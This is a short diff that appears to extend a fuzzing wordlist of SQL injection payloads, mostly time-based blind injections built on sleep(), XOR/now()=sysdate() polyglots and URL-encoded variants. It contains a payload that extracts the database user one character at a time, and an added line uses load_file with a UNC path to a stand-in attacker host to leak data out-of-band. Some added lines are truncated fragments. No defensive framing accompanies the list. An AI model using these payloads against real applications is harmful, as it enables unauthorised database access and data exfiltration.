@@ -1,2 +1,13 @@
 (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
 /(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'"%2B(select(0)from(select(sleep(9)))v)%2B"*/
+'%2b(select*from(select(sleep(20)))a)%2b'
+XOR(if(now()=sysdate(),sleep(5),0))XOR
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+'+AND+(SELECT+2016+FROM+
+ OR SLEEP(10/7) --
+'; SELECT load_file('\\\\attacker(.)com\\leak')--
+'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+id=1),1,1)='a', SLEEP(5),0)
+' OR IF(ASCII(SUBSTR(user(),1,1))=114,SLEEP(5),0)--
+"id":"56456 AND sleep(15)#"
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)
